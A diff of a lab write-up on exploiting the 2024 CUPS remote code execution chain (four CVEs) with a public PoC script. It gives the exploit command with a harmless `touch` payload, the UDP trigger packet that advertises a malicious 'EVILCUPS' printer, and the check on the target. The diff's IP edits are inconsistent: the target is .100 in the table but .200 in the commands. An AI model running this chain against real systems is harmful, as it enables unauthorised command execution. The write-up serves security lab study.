@@ -8,9 +8,9 @@ Full exploitation of the 2024 CUPS RCE chain, building on the detection-stage co
 
 | Item | Value |
 |---|---|
-| Target | 192.168.144.132 |
+| Target | 192.168.144.100 |
 | Vulnerable components | cups-browsed 1.28.17-3, libcupsfilters1 1.28.17-3, cups-filters 1.28.17-3 (all pre-`+deb12u1`) |
-| Attacker | Kali, 192.168.144.129 |
+| Attacker | Kali VM on the same host-only lab network |
 | Tooling | `0xCZR1/PoC-Cups-RCE-CVE-exploit-chain` (`cups-rce.py`), Python 3, `ippserver` |
 | CVEs chained | CVE-2024-47176 (unauth UDP trigger), CVE-2024-47076 (unsanitised IPP attribute validation), CVE-2024-47175 (unsanitised PPD generation), CVE-2024-47177 (FoomaticRIPCommandLine command execution) |
 
@@ -40,20 +40,20 @@ pip install -r requirements.txt --break-system-packages
 
 **On Kali**, the actual script is `cups-rce.py` (the README's usage example references a stale filename, `poc.py`, which does not exist in the repository; this was confirmed by listing the repo's actual files):
 ```bash
-python3 cups-rce.py 192.168.144.129 192.168.144.132 "touch /tmp/CUPS_RCE_PWNED"
+python3 cups-rce.py 192.168.144.129 192.168.144.200 "touch /tmp/CUPS_RCE_PWNED"
 ```
 
 Output:
 ```
 Starting IPP server at ('192.168.144.129', 12349)
-Sending UDP packet to 192.168.144.132:631...
+Sending UDP packet to 192.168.144.200:631...
 Packet content:
 2 3 http://192.168.144.129:12349/printers/EVILCUPS "Pwned Location" "Pwned Printer" "HP LaserJet 1020"
 ```
 
 The script's packet uses type `2` (versus the `0` used in the manual reconnaissance tests) and includes a fourth quoted field for a make-and-model string, both accepted correctly by `cups-browsed`.
 
-**On the target** (SSH as `uow-admin@192.168.144.132`), confirming the malicious queue was created and accepted, not torn down as it was during the earlier manual/Metasploit-auxiliary attempts that lacked a real IPP attribute response:
+**On the target** (SSH as `uow-admin@192.168.144.200`), confirming the malicious queue was created and accepted, not torn down as it was during the earlier manual/Metasploit-auxiliary attempts that lacked a real IPP attribute response:
 ```bash
 lpstat -p
 ```
